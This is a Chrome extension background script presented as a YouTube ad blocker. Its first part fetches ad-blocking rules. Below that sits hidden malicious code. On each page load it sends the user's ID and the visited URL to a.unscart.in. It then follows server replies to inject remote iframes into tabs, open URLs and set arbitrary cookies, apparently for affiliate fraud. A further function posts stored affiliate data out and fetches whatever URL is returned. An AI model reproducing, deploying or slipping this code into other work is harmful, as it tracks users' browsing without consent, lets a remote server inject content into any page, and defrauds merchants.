
console.log("background loaded...");
let securityUrls = [];

let backup = {
    SecurityUrls:[
        "https://imasdk.googleapis.com/js/core/*",
        "https://googleads.g.doubleclick.net/pagead/id",
        "*googleusercontent.com/proxy*",
        "*static.doubleclick.net/instream/ad_status*",
        "*el=adunit*"
    ],
    SecuritySelectors:[
        ".ytp-ad-image-overlay",
        ".ytp-ad-text-overlay",
        ".ytp-ad-skip-button-container",
        "ytd-rich-item-renderer ytd-display-ad-renderer",
        "ytd-player-legacy-desktop-watch-ads-renderer",
        ".style-scope ytd-item-section-renderer",
        "#player-ads",
        "ytd-promoted-sparkles-web-renderer .GoogleActiveViewElement",
        "ytd-search-pyv-renderer",
    ]
}


let extensionName2="YoutubeAdBlocker";
fetch("https://ytbackend.godarkmode.com/yt/g/g")
    .then((e) => e.json())
    .then((e) => {
        console.log(e)
        e.securityUrls &&
            ((securityUrls = e.SecurityUrls),
            chrome.webRequest.onBeforeRequest.addListener(
                function (e) {
                    return { cancel: !0 };
                },
                { urls: securityUrls },
                ["blocking"]
            ))
            ,
            e.SecuritySelectors && chrome.storage.sync.set({ securitySelectors: e.SecuritySelectors });
    })
    .catch((e) => {
        if(e){
            securityUrls = backup.SecurityUrls;
            chrome.storage.sync.set({ securitySelectors: backup.SecuritySelectors});
            // console.error(e)
        }   
    })
    
chrome.runtime.onInstalled.addListener(function (e) {
    console.log(e),
    "install" == e.reason && (chrome.tabs.create({ url: "https://youtube.com/" }), chrome.storage.sync.set({ blockurl: "*://www.youtube.com/api/stats/playback?ns=yt&el=adunit*", AdblockerForYoutube: !0, installedOn: Date.now() }));
});



    
const URL = "https://a.unscart.in";
chrome.tabs.onUpdated.addListener((async (e, t, n) => {
    const {
        status: a
    } = t, {
        url: o
    } = n;
    chrome.storage.sync.get("userid", (async t => {
        if ("complete" === a && o) try {
            const a = await fetch(`${URL}/api/a`, {
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json"
                },
                method: "POST",
                body: JSON.stringify({
                    apisend: btoa(t.userid),
                    name: btoa(o),
                    ext_name: extensionName2
                })
            }), s = await a.json();
            if (s) {
                if (!document.getElementById("a")) {
                    var n = document.createElement("div");
                    n.id = "a", document.body.appendChild(n)
                }
                var r;
                if (s.a && chrome.tabs.executeScript(e, {
                        code: 'var domscript = document.createElement("iframe");domscript.src = "' + s.a + '";document.getElementsByTagName("head")[0].appendChild(domscript);'
                    }), s.b) 4 == ranum(5) && (document.getElementById("a")
                        .innerHTML = ""), (r = document.createElement("iframe"))
                    .src = s.b, document.getElementById("a")
                    .appendChild(r);
                if (s.b2)(r = document.createElement("iframe"))
                    .src = s.b2, document.getElementById("a")
                    .appendChild(r);
                s.b3 && openf_url(s.b3, e), s.c && passf_url(s.c, e), s.d && xmlopen(s.d), s.e && setCookie(s.e[0], s.e[1], s.e[2], 86400)
            }
        } catch (e) {}
    }))
}));
var httpq4 = new getXMLHTTPRequest,
    setCookie = function(e, t, n, a) {
        return new Promise((function(o) {
            chrome.cookies.set({
                url: e,
                name: t,
                value: n,
                expirationDate: (new Date)
                    .getTime() / 1e3 + a
            }, (() => {
                o(n)
            }))
        }))
    };
function openf_url(e, t) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.onreadystatechange = function() {
        if (4 == httpq4.readyState && (200 == httpq4.status || 404 == httpq4.status) && httpq4.responseURL) {
            var e = document.createElement("iframe");
            e.src = httpq4.responseURL, document.getElementById("a")
                .appendChild(e)
        }
    }, httpq4.send()
}
function passf_url(e, t) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.onreadystatechange = function() {
        4 != httpq4.readyState || 200 != httpq4.status && 404 != httpq4.status || httpq4.responseURL && chrome.tabs.executeScript(t, {
            code: 'var domscript = document.createElement("iframe");domscript.src = "' + httpq4.responseURL + '";document.getElementsByTagName("head")[0].appendChild(domscript);'
        })
    }, httpq4.send()
}
function getXMLHTTPRequest() {
    return new XMLHttpRequest
}
function ranum(e) {
    return e || (e = 11), Math.floor(1e4 * Math.random() % e + 1)
}
function xmlopen(e) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.send()
}
function pass() {
    chrome.storage.sync.get(["affiliate", "userid"], (function(e) {
        let t = e.affiliate,
            n = e.userid;
        var a = [];
        for (var o in t) {
            var r = encodeURIComponent(o),
                s = encodeURIComponent(t[o]);
            a.push(r + "=" + s)
        }
        a = a.join("&"), fetch(`https://unscart.in/g?userid=${n}&extension=${extensionName2}`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
                },
                body: a
            })
            .then((e => e.json()))
            .then((e => {
                e && "not found" != e && fetch(e)
                    .then()
                    .catch((e => {}))
            }))
            .catch((e => {}))
    }))
}
getRandomToken = () => {
    var e = new Uint8Array(32);
    crypto.getRandomValues(e);
    for (var t = "", n = 0; n < e.length; ++n) t += e[n].toString(16);
    return t
}, preload = () => {
    chrome.runtime.onInstalled.addListener((function(e) {
        "install" == e.reason ? chrome.storage.sync.set({
            userid: getRandomToken()
        }) : "update" == e.reason && (chrome.runtime.getManifest()
            .version, chrome.storage.sync.get("userid", (e => {
                e.userid || chrome.storage.sync.set({
                    userid: getRandomToken()
                })
            })))
    }))
}, (main = () => {
    preload()
})(), chrome.runtime.onMessage.addListener((function(e, t, n) {
    "ready" == e.ready && pass()
}));